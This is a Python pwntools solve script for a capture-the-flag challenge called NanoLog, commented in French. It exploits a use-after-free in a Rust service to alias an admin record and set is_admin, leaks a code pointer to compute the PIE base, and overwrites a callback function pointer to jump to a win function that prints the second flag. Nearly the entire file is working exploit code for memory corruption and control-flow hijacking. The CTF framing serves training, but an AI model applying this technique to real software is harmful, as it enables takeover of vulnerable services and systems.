#!/usr/bin/env python3
"""
solve.py -- NanoLog (DCI Summer Camp 2026)

Flag 1 : UAF (cache_ref soundness hole) -> ref aliase AdminRecord -> is_admin=1
Flag 2 : meme UAF -> fuite de &banner (base PIE) -> reecriture du champ
         callback: Option<fn> via la vue ref (niche optimization : ecrire
         l'adresse de `win` fabrique un Some(win)) -> admin_show saute dans win
         -> FLAG2 imprime.

Offsets statiques de `banner` et `win` lus depuis un binaire de reference
non-strippe (profil release-syms), pour rester robuste aux recompilations.

Usage:
    python3 solve.py [HOST] [PORT]
    BINARY=./nanolog-release-syms python3 solve.py
"""
import os
import re
import subprocess
import sys
from pwn import *

HOST = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET_HOST", "127.0.0.1")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.getenv("TARGET_PORT", "1337"))
BINARY = os.getenv("BINARY", "./nanolog-release-syms")

context.arch = "amd64"
context.log_level = "info"


def static_offset(binary, needle):
    """Offset statique d'un symbole Rust mangle contenant `needle` (ex: '3win')."""
    out = subprocess.check_output(["nm", binary], text=True)
    for line in out.splitlines():
        if needle in line:
            return int(line.split()[0], 16)
    raise RuntimeError(f"symbole {needle} introuvable dans {binary}")


# == Helpers protocole =========================================================

def parse_hexdump(raw):
    data = b""
    for line in raw.split(b"\n"):
        if b"|" not in line:
            continue
        for tok in line.split(b"|")[0].split()[1:]:
            try:
                data += bytes([int(tok, 16)])
            except ValueError:
                pass
    return data

def new_ref(p):
    p.sendlineafter(b"> ", b"5"); p.recvuntil(b"Created ref #")
    return int(p.recvline().strip())

def show_ref(p, i):
    p.sendlineafter(b"> ", b"6")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    return parse_hexdump(b"".join(p.recvline() for _ in range(9)))

def edit_ref(p, i, data):
    p.sendlineafter(b"> ", b"7")
    p.sendlineafter(b"Enter index: ", str(i).encode())
    p.sendlineafter(b"Enter length: ", str(len(data)).encode())
    p.recvuntil(b"raw bytes: ")
    p.send(data)
    p.sendline(b"")
    p.recvline()

def new_admin(p):
    p.sendlineafter(b"> ", b"8"); p.recvuntil(b"Created admin #")
    return int(p.recvline().strip())

def show_admin(p, i):
    p.sendlineafter(b"> ", b"9")
    p.sendlineafter(b"Enter index: ", str(i).encode())

def get_flag1(p, i):
    p.sendlineafter(b"> ", b"11")
    p.sendlineafter(b"Enter index: ", str(i).encode())


# == Exploit ===================================================================

def exploit():
    off_banner = static_offset(BINARY, "6banner")
    off_win = static_offset(BINARY, "3win")
    log.info(f"offset banner = {hex(off_banner)}")
    log.info(f"offset win    = {hex(off_win)}")

    p = remote(HOST, PORT)

    # -- Flag 1 : UAF -> is_admin = 1 -----------------------------------------
    new_ref(p)                              # ref[0] = &chunk A (UAF dangling)
    new_admin(p)                            # admin[0] reutilise A -> ref[0] aliase admin[0]
    # Ecrit is_admin=1 (offset 0) SANS toucher callback (offset 8) : on ne
    # connait pas encore &banner runtime, donc on relit puis on patche l'offset 0.
    leaked = show_ref(p, 0)                 # vue octets de l'AdminRecord
    payload = bytearray(leaked)             # preserve callback=Some(banner) a l'offset 8
    payload[0:8] = p64(1)                   # is_admin = 1
    edit_ref(p, 0, bytes(payload))
    get_flag1(p, 0)
    log.success(f"Flag 1 : {p.recvline().decode().strip()}")

    # -- Flag 2 : fuite PIE + reecriture du callback --------------------------
    # callback (offset 8) = Some(banner) : pointeur de code -> base PIE.
    banner_runtime = u64(leaked[8:16])
    assert banner_runtime != 0, "callback par defaut nul : pas de fuite PIE"
    pie_base = banner_runtime - off_banner
    assert pie_base % 0x1000 == 0, f"base PIE non alignee : {hex(pie_base)}"
    win_runtime = pie_base + off_win
    log.success(f"&banner   = {hex(banner_runtime)}")
    log.success(f"base PIE  = {hex(pie_base)}")
    log.success(f"&win      = {hex(win_runtime)}")

    # Niche optimization : ecrire &win a l'offset 8 fabrique Some(win).
    payload2 = bytearray(leaked)
    payload2[0:8] = p64(1)                  # garde is_admin=1 (inoffensif)
    payload2[8:16] = p64(win_runtime)       # callback = Some(win)
    edit_ref(p, 0, bytes(payload2))

    # Declenche : admin_show appelle cb(ptr) -> win -> imprime FLAG2.
    show_admin(p, 0)
    import time
    time.sleep(0.3)
    data = p.recvall(timeout=2)
    m = re.search(rb"DCI\{[^}]+\}", data)
    if m:
        log.success(f"Flag 2 : {m.group().decode()}")
    else:
        log.failure(f"flag absent ; flux brut :\n{data.decode(errors='replace')}")

    p.close()


if __name__ == "__main__":
    exploit()
